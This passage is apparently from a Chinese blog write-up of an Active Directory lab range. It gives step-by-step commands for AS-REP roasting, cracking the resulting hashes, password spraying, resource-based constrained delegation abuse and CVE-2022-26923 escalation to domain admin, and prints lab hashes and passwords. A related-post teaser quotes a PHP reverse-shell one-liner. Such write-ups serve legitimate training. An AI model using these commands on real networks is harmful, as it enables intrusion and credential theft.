class="line">chenjianhua@xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<h3 id="XR-0687-AS-ERP-Roasting"><a href="#XR-0687-AS-ERP-Roasting" class="headerlink" title="XR-0687  AS-ERP Roasting"></a>XR-0687  AS-ERP Roasting</h3><blockquote>
+<p>AS-REP Roasting攻击:</p>
+</blockquote>
+<p>Kerberos身份认证的第一个过程又被称为域身份验证，主要是为了防止与用户密码脱机爆破。如果与用户关闭了预身份验证（“Do not require Kerberos preauthentication”）的话，攻击者可以使用指定的用户向域控制器发送AS-REQ请求。然后域控制器会返回TGT票据和加密的Session-key等信息。因此攻击者就可以对获取到的加密Session-key进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。这种攻击方式被称作AS-REP Roasting攻击。</p>
+<blockquote>
+<p>‍</p>
+</blockquote>
+<p>AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 “Do not require Kerberos preauthentication(不需要kerberos预身份验证) “ 。而该属性默认是没有勾选上的。<br>预身份验证是Kerberos身份验证的第一步(AS_REQ &amp; AS_REP)，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。关于 AS_REQ &amp; AS_REP：域内认证之Kerberos协议详解。<br>当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。</p>
+<blockquote>
+<p>‍</p>
+</blockquote>
+<p>AS-REP Roasting攻击条件<br>域用户设置了 “Do not require Kerberos preauthentication(不需要kerberos预身份验证)”<br>需要一台可与KDC进行通信的主机&#x2F;用户<br>进行攻击</p>
+<p>上方获取大量账户数据，猜测有可能存在不需要 Kerberos 预身份验证的账户，我们使用GetNPUsers.py 来识别哪些用户账户未启用预身份验证。这个工具是专门用于获取目标域中用户的 TGT 请求。如果返回了可以进行 AS-REP Roasting 的用户信息，那么这些用户的账户很可能设置了不需要预身份验证。</p>
+<p>跑一下，看一下是否存在有<strong>不要求Kerberos 预身份验证</strong>的账户。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetNPUsers.py -dc-ip 172.22.15.13 xiaorang.lab/ -usersfile /home/symya/桌面/email.txt</span><br></pre></td></tr></table></figure>
+
+<p>获取TGT票据</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:e5b9df0a854b830ce5f6e5ffe2499d71$d9d9dc060842070cd86a8ecae9e214d3a0ca14b815dc3c39e39c02a33d8e905757ff35a61a31e6dae59482b894e391be7ac67d4f7f484c37cc1dd80c93be6c30ac3a3e8217380170959db080a27cf29adff473385a7c554fe06c8512039f90255f853ce5be6e456377d5aec2530e674ac79c79bae51343f0150105c46703f0a7f1ba694e72c5b4d24aea907e04c33579b7601bda211fa28e0704115de88b9c073ab8863108a2013e8ec447163ec837615ca4dce0798bfdc3424400bdb37a5f0c0497ba4d7b4da0b56c726aca69ef6234ce75776b5bed88c814ec1d0b75b64cb38e94ff66ef5ef3b0a4b4ac8b</span><br><span class="line"></span><br><span class="line">$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:65b092a36dd8d1c0c081c95ced2a0b5c$086f1297cb9911ce21af8569c7ffa32cd14a45c40e4b8b6d238eef27ba3950ca99d6101a323a4b3fa208c5569079d6090aa3ac6e8282e9ebcf648f8fff5931a2a171818303a0028b2fa3efc2bdd83650f8bbf4d303ef3974df40671e4185a8b47f424c64a416bd394501f122bb3e92d12b801f66eb5c6b3851337423e6242dbb85922fa767eb1855c1e2568d328c88158e9810ee2de558e0478026341ef05645ef5b23f943c6967590aea7d5f68a77d7ce6fe30e5536aabb7909c6695963f8dd47259e3b64922440007cb38e9252657053008213812802a49a3dbb27d8a3047a3489d9e81e24d4a64fa57d97</span><br></pre></td></tr></table></figure>
+
+<p>将申请到的TGT保存在文件中，使用John加载rockyou进行暴力破解。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt /home/symya/桌面/hash.txt</span><br></pre></td></tr></table></figure>
+
+<p>爆破出来为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lixiuying:winniethepooh </span><br><span class="line">huachunmei:1qaz2wsx</span><br></pre></td></tr></table></figure>
+
+<p>找一下这个是哪台机子的账密，crackmapexec喷洒一下。使用 <code>crackmapexec</code> 工具尝试使用破解得到的密码进行 SMB 登录，确定哪些机器可以访问。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q crackmapexec smb 172.22.15.0/24 -u &#x27;lixiuying&#x27; -p &#x27;winniethepooh&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>发现只有只有172.22.15.35(XR-0687)可以成功登录上</p>
+<p>rdp登录</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lixiuying@xaiorang.lab</span><br><span class="line">winniethepooh</span><br></pre></td></tr></table></figure>
+
+<h3 id="ACL-Abuse-RBCD提权"><a href="#ACL-Abuse-RBCD提权" class="headerlink" title="ACL Abuse+RBCD提权"></a>ACL Abuse+RBCD提权</h3><p>用 bloodhound 收集域内信息。BloodHound 是一个强大的内网域渗透提权分析工具，它把域中各种抽象的概念和结构放在了一个能运行且直观，并易于使用的图形化功能中，自动用于提取和分析数据，高效准确地显示如何提升 AD 域中的权限。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -c all -ns 172.22.15.13 --zip --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-d xiaorang.lab 指定目标域名。告诉 BloodHound 要查询的 Active Directory 域。</li>
+<li>-c all 指定要收集的命令类型。- - <code>all</code> 表示收集所有可用的信息，包括用户权限、组关系、ACLs 等。</li>
+<li>-ns 指定 DNS 服务器的 IP 地址。用于解析域名，以确保能够正确连接到 Active Directory。</li>
+<li>强制使用 TCP 协议进行 DNS 查询。</li>
+</ul>
+<p>可以看到 lixiuying 对 XR-0687 具有 GenericWrite 权限，那么我们就可以通过配置 RBCD 拿到 XR-0687 的权限</p>
+<p>解释一下为什么具有 GenericWrite 权限，就可以通过配置 RBCD 拿到 XR-0687 的权限。<br>介绍如何滥用ACL进行域权限维持<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130650.png" alt="image.png"></p>
+<blockquote>
+<p>基于资源的约束委派（Resource-Based Constrained Delegation，RBCD）是在Windows Server 2012中新引入的功能。与传统的约束委派相比，它将设置委派的权限交还给了服务资源自身，也就是说服务自己可以决定“谁可以对我进行委派。”基于资源的约束委派的关键在于msDS-AllowedToActOnBehalfOfOtherIdentity属性的设置。</p>
+</blockquote>
+<p>使用impacket工具<br>首先添加一个机器账户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 addcomputer.py xiaorang.lab/lixiuying:&#x27;winniethepooh&#x27; -dc-ip 172.22.15.13 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;123@asd&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​<code>xiaorang.lab/lixiuying:&#39;winniethepooh&#39;</code>指定域，用户，密码</li>
+<li>-dc-ip 172.22.15.13 指定域控制器的 IP 地址。以便执行对 Active Directory 的更改。</li>
+<li>-dc-host xiaorang.lab 指定域控制器的主机名。</li>
+<li>-computer-name ‘TEST$’  账户名称以 <code>$</code> 结尾表示这是一个计算机账户，这种账户可以用作委派的目标。</li>
+<li>为新创建的计算机账户设置密码。</li>
+</ul>
+<p>rbcd攻击</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 rbcd.py xiaorang.lab/lixiuying:&#x27;winniethepooh&#x27; -dc-ip 172.22.15.13 -action write -delegate-to &#x27;XR-0687$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​<code>xiaorang.lab/lixiuying:&#39;winniethepooh&#39;</code>指定域，用户，密码</li>
+<li>​ <strong>​<code>-dc-ip 172.22.15.13</code>​</strong>  定域控制器的 IP 地址</li>
+<li>-action write 指定要执行的操作类型。 在 RBCD 攻击中，<code>write</code> 操作允许脚本修改或添加委派权限。</li>
+<li>​ <strong>​<code>-delegate-to &#39;XR-0687$&#39;</code>​</strong> : 指定委派的目标账户。</li>
+<li>​ <strong>​<code>-delegate-from &#39;TEST$&#39;</code>​</strong> ​: 指定委派的来源账户。<br>它允许用户利用计算机账户（<code>TEST$</code>​）的权限，将这些权限委派给目标计算机账户（<code>XR-0687$</code>​）。成功后，攻击者可以利用 <code>XR-0687$</code> 进行更高级别的操作，甚至可能获得管理员权限。</li>
+</ul>
+<p>得到机器码，<code>TEST$</code> 计算机账户的 SID，表示账户在域中的唯一标识</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TEST$        (S-1-5-21-3745972894-1678056601-2622918667-1147)</span><br></pre></td></tr></table></figure>
+
+<p>下一步是创建票据<br>在创建票据之前，我们先来讲讲Kerberos 身份认证流程<br>Kerberos 是一种基于票证的身份验证协议。它基本上是这样工作的：</p>
+<blockquote>
+<p>1.客户端向KDC（Key Distribution Center，通常是域控制器）请求TGT（Ticket Granting Ticket）。请求用户的密钥之一用于预身份验证。 TGT 由身份验证服务 (AS) 提供。客户端的请求被称为AS-REQ，应答被称为AS-REP。<br>2.客户端使用 TGT 向 KDC 请求 ST（服务票证）。该票证由票证授予服务 (TGS) 提供。客户端的请求被称为TGS-REQ，应答被称为TGS-REP。<br>3.客户端使用ST（服务票证）来访问服务。客户端对服务的请求被称为调用AP-REQ，服务的响应被称为调用AP-REP。<br>4.两种票证（TGT 和 ST）通常都包含加密的 PAC（特权身份验证证书），目标服务将读取一组信息来决定身份验证用户是否可以访问该服务（用户 ID、组成员身份等） 。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130653.png" alt="image.png"></p>
+<p>黄金票据<br>黄金票证是一种权限维持手段，攻击者获得了对 Active Directory 密钥分发服务帐户 （KRBTGT） 的控制权，并使用该帐户伪造有效的 Kerberos 票证授予票证 （TGT）。这使攻击者能够访问 Active Directory 域上的任何资源，如果有 KRBTGT 哈希，您可以伪造自己的 TGT，其中包括想要的任何组成员身份的 PAC 数据<br>利用条件：<br>黄金票据的使用的必要票件是获取域中 <code>krbtgt</code>​ 用户使用的加密密钥之一，然而加密密钥之一就是该账户的<code>NTLM HASH</code>值</p>
+<p>白银票据是伪造的 <code>Kerberos Ticket Grant Service （TGS）</code> 票证，银票仅允许攻击者伪造特定服务的票证授予服务 （TGS） 票据。TGS 票证使用服务的密码哈希值进行加密，因此如果攻击者窃取了服务帐户的哈希值，就可以生成白银票据。<br>白银票据所需的利用条件和黄金票据是相同的，只是秘钥换成了对应服务的机器账户 Hash(尾部带$的均为机器账户)</p>
+<p>创建票据<br>由于我们目前只有机器账户，所以我们选择生成的是白银票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;123@asd&#x27; -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-spn cifs&#x2F;XR-0687.xiaorang.lab  指定要获取票据的服务主体名称。 确保票据是针对正确服务生成的。</li>
+<li>-impersonate Administrator  指定要假冒的用户账户。 以管理员身份获取权限。</li>
+</ul>
+<p>导入票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>设置环境变量以指定票据缓存文件，允许后续的身份验证使用该票据</li>
+</ul>
+<p>报错：<code>[Errno 111] Connection refused</code>，改&#x2F;etc&#x2F;hosts<br>无密码连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 psexec.py  -k -no-pass -dc-ip 172.22.15.13 administrator@XR-0687.xiaorang.lab -codec gbk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-q 安静模式，不输出不必要的信息</li>
+<li>使用 <code>psexec</code> 工具在远程机器上执行命令。</li>
+<li>-k 使用 Kerberos 票据进行身份验证。</li>
+<li>-no-pass  不需要密码进行连接。</li>
+<li>​<code>administrator@XR-0687.xiaorang.lab</code>  指定要登录的目标机器和账户。</li>
+<li>-codec gbk 指定字符编码，用于确保正确处理字符集。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130656.png" alt="image.png"><br>得flag03，猜测与flag02中的路径一致，直接读取，成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130658.png" alt="image.png"></p>
+<h3 id="Active-Directory-域权限提升漏洞-CVE-2022-26923"><a href="#Active-Directory-域权限提升漏洞-CVE-2022-26923" class="headerlink" title="Active Directory 域权限提升漏洞(CVE-2022-26923)"></a>Active Directory 域权限提升漏洞(CVE-2022-26923)</h3><p>2022年5月10日，微软发布补丁修复了一个Active Directory域权限提升漏洞（CVE-2022-26923）。该漏洞是由于对用户属性的不正确获取，允许低权限用户在安装了Active Directory证书服务（AD CS）的域环境中将权限提升至域管理员。</p>
+<p>默认情况下，域用户账户可以注册User证书模板，计算机账户可以注册Machine证书模板。两个证书模板都允许执行客户端身份验证。<br>在申请计算机证书时，ADCS将计算机对象的dNSHostName属性的值添加到证书的主题备用名称中。当我们使用证书进行身份验证是，KDC会尝试将这个dNSHOstName属性值从证书映射到目标账户。<br>因此，如果我们将某个可控计算机账户（Test1$）的dNSHostName值改为与域控制器的计算机账户相同的dNSHostName值，那么就意味着我们可以欺骗ADCS，并最终申请到域控制器的AD证书。</p>
+<p>简述：通过构造机器账户并篡改dNSHostName属性，在证书申请时AD CS将dNSHostName属性嵌入证书中，进而机器账户获得高权限的域控身份。</p>
+<p>简单的来说：<br>CVE-2022-26923 是一个影响 Active Directory 证书服务 (AD CS) 的权限提升漏洞。它允许低权限用户通过篡改计算机账户的 <code>dNSHostName</code> 属性来获取域控制器的高权限访问。攻击者可以利用此漏洞申请域控制器的证书，从而在域环境中获取管理员权限。<br>攻击流程概述</p>
+<ol>
+<li><strong>添加机器账户</strong>：创建一个新的计算机账户，并将其 <code>dNSHostName</code> 属性设置为域控制器的主机名。</li>
+<li><strong>申请证书</strong>：利用新创建的机器账户请求证书。</li>
+<li><strong>获取票据</strong>：通过证书认证获得访问权限。</li>
+<li><strong>利用 RBCD</strong>：将获得的证书配置到 RBCD，借此获得对域控制器的权限。</li>
+<li><strong>执行攻击</strong>：通过 <code>psexec</code> 连接到域控制器并读取敏感信息（如 flag）。</li>
+</ol>
+<p>添加一个账户,然后设置 DNS Host Name 为域控的 XR-DC01.xiaorang.lab。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy account create -user &#x27;test2&#x27; -pass &#x27;123@asd&#x27; -dns XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 -u lixiuying -p &#x27;winniethepooh&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​<strong>​<code>certipy account create</code>​</strong>: 使用 Certipy 工具创建计算机账户。</li>
+<li>​ <strong>​<code>-user &#39;test2&#39;</code>​</strong> : 设置要创建的账户名。</li>
+<li>​ <strong>​<code>-pass &#39;123@asd&#39;</code>​</strong> : 设置新账户的密码。</li>
+<li>​ <strong>​<code>-dns XR-DC01.xiaorang.lab</code>​</strong>​: 设置 <code>dNSHostName</code> 为域控制器的主机名。</li>
+<li>​ <strong>​<code>-dc-ip 172.22.15.13</code>​</strong>: 指定域控制器的 IP 地址。</li>
+<li>​ <strong>​<code>-u lixiuying -p &#39;winniethepooh&#39;</code>​</strong> : 提供有权限执行该操作的用户凭据。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130702.png" alt="image.png"><br>然后用这个账户向 XR-CA请求证书</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy req -u &#x27;test2$@xiaorang.lab&#x27; -p &#x27;123@asd&#x27; -ca &#x27;xiaorang-XR-CA-CA&#x27; -target 172.22.15.18 -template &#x27;Machine&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​<strong>​<code>certipy req</code>​</strong>: 请求证书的命令。</li>
+<li>​ <strong>​<code>-u &#39;test2$@xiaorang.lab&#39;</code>​</strong> : 使用创建的机器账户请求证书。</li>
+<li>​ <strong>​<code>-p &#39;123@asd&#39;</code>​</strong> : 账户密码。</li>
+<li>​ <strong>​<code>-ca &#39;xiaorang-XR-CA-CA&#39;</code>​</strong> : 指定要请求证书的 CA 名称。</li>
+<li>​ <strong>​<code>-target 172.22.15.18</code>​</strong>: 指定目标 CA 的 IP 地址。</li>
+<li>​ <strong>​<code>-template &#39;Machine&#39;</code>​</strong> : 使用 Machine 证书模板。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130705.png" alt="image.png"><br>检索 Hash 生成票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​<strong>​<code>certipy auth</code>​</strong>: 使用生成的 PFX 证书进行认证。</li>
+<li>​ <strong>​<code>-pfx xr-dc01.pfx</code>​</strong>​: 指定之前申请到的 PFX 证书文件。<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130708.png" alt="image.png"><br>报错</li>
+</ul>
+<blockquote>
+<p>KDC_ERR_PADATA_TYPE_NOSUPP<br>在尝试使用智能卡登录时，无法找到合适的证书。可能是由于查询了错误的认证机构（CA）<br>当域控制器没有安装智能卡（域控制器或域控制器认证模板）的证书时，也可能发生这种情况。</p>
+</blockquote>
+<p>尝试 Schannel，通过 Schannel将证书传递到 LDAPS, 修改 LDAP 配置 (例如配置 RBCD &#x2F; DCSync), 进而获得域控权限。<br>转换证书格式  ,把pfx导出为.key 和.crt 两个文件。密码为空密码即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in xr-dc01.pfx -nodes -out test.pem</span><br><span class="line">openssl rsa -in test.pem -out test.key</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​<strong>​<code>openssl pkcs12</code>​</strong>: 将 PFX 格式的证书转换为 PEM 格式。</li>
+<li>​<strong>​<code>test.pem</code>​</strong>: 输出的 PEM 文件，包含证书和私钥。</li>
+</ul>
+<p>打一个证书传递攻击<br>下载PassTheCert.py</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q passthecert.py -action whoami -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.15.13 </span><br></pre></td></tr></table></figure>
+
+<p>下一步将证书配置到域控的 RBCD</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q passthecert.py -action write_rbcd -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to &#x27;XR-DC01$&#x27; -delegate-from &#x27;test2$&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>将证书配置到 RBCD，使得 <code>test2$</code>​ 可以代理 <code>XR-DC01$</code>​，从而获取域控的高权限<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130711.png" alt="image.png"><br>申请ST</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q getST.py xiaorang.lab/&#x27;test2$&#x27;:&#x27;123@asd&#x27; -dc-ip 172.22.15.13 -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​<strong>​<code>getST.py</code>​</strong>: 申请服务票据的脚本。</li>
+<li>​ <strong>​<code>-spn cifs/XR-DC01.xiaorang.lab</code>​</strong>: 指定要申请的服务主体名称。</li>
+<li>​ <strong>​<code>-impersonate Administrator</code>​</strong>​: 以管理员身份获取服务票据。<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130713.png" alt="image.png"></li>
+</ul>
+<p>导入申请的票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>设置环境变量以指定 Kerberos 票据缓存，允许后续的身份验证使用该票据。<br>连接，也要修改&#x2F;etc&#x2F;hosts</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 psexec.py Administrator@XR-DC01.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​<strong>​<code>psexec.py</code>​</strong>: 使用 psexec 工具连接到目标机器。</li>
+<li>​ <strong>​<code>-k</code>​</strong>: 使用 Kerberos 票据进行身份验证。</li>
+<li>​ <strong>​<code>-no-pass</code>​</strong>: 不需要密码进行连接。<br>读flag</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130717.png" alt="image.png"></p>
+<p>‍</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://symya.github.io">symv1a</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://symya.github.io/post/the-intranet-shooting-range-reappears-in-the-2022-netding-cup-finals-1fl3li.html">https://symya.github.io/post/the-intranet-shooting-range-reappears-in-the-2022-netding-cup-finals-1fl3li.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/thm-offensive-pentesting-section2-relevant-z18fgvu.html" title="THM - Offensive Pentesting - Section2 - Relevant"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Relevant</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Relevant 您已被指派给一位客户，该客户希望对七天内将要发布到生产环境中进行渗透测试。 工作范围 客户要求工程师对提供的虚拟环境进行评估。客户要求提供关于评估的最低限度的信息，希望从恶意行为者的角度进行评估（黑盒渗透测试）。客户要求您获取两个 flag（未提供位置）作为漏洞利用的证据：  用户.txt 根.txt  此外，客户还提供了以下范围许可：  本次活动允许使用任何工具或技术，但我们要求您首先尝试手动利用 找到并记录发现的所有漏洞 将发现的标志提交到仪表板 只有分配给您的机器的 IP 地址在范围内 查找并报告所有漏洞（是的，根路径不止一条）  （角色扮演关闭） 我鼓励你把这次挑战当成一次真正的渗透测试来对待。你可以考虑写一份报告，其中包含执行摘要、漏洞和利用评估以及补救建议，这将有助于你准备 eLearnSecurity 认证专业渗透测试员，或成为一名渗透测试员。注意 - 此房间内的任何内容都不需要Metasploit 机器可能需要最多 5...</div></div></div></a><a class="pagination-related" href="/post/commons-collections-1analysis-25uypm.html" title="Commons Collections 1分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Commons Collections 1分析</div></div><div class="info-2"><div class="info-item-1">Commons Collections 1分析环境依赖 1234Apache Commons Collections 3.0 - 4.0后续在 3.2.2/4.1 版本做了修复TransformedMap - jdk &lt; 8u71  1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-collections&lt;/groupId&gt;        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;        &lt;version&gt;3.2.1&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;  前置知识AbstractMapDecorator首先 CC 库中提供了一个抽象类 org.apache.commons.collections.map.AbstractMapDecorator，这个类是 Map...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/post/kenobi-z1xnvhq.html" title="THM - Offensive Pentesting - Section - Kenobi"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-07</div><div class="info-item-2">THM - Offensive Pentesting - Section - Kenobi</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section - Kenobi此房间将涵盖访问 Samba 共享、纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。有关利用 Linux 计算机的演练。枚举 Samba 的共享，作易受攻击的 proftpd 版本，并通过路径变量作提升您的权限。 ‍ nmap 扫描 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475nmap -sV -sC -p- --min-rate 10000 10.10.166.21Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-07 09:40 EDTNmap scan report for 10.10.166.21Host is up (0.24s...</div></div></div></a><a class="pagination-related" href="/post/overpass-2-hacked-1pfl8c.html" title="THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-18</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked Overpass 被黑了！SOC团队（Paradox，恭喜升级）在深夜值班时查看 shibes 时发现了可疑活动，并成功捕获了攻击发生时的数据包。 您能弄清楚攻击者是如何入侵的，并重新入侵 Overpass 的生产服务器吗？  他们用来上传反向 shell 的页面 URL 是什么？流量包中可以看到是development  ‍ payload 1&lt;?php exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&quot;)?&gt;  密码在tcp流3中  发现使用了ssh-backdoor  1git clone...</div></div></div></a><a class="pagination-related" href="/post/skynet-z1e39th.html" title="THM - Offensive Pentesting - Section2 - Skynet"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-14</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Skynet</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Skynet‍ 外网打点nmap扫描报告12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849nmap -sV -sC -p- --min-rate 10000 10.10.220.42Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-14 03:50 EDTWarning: 10.10.220.42 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.220.42Host is up (0.23s 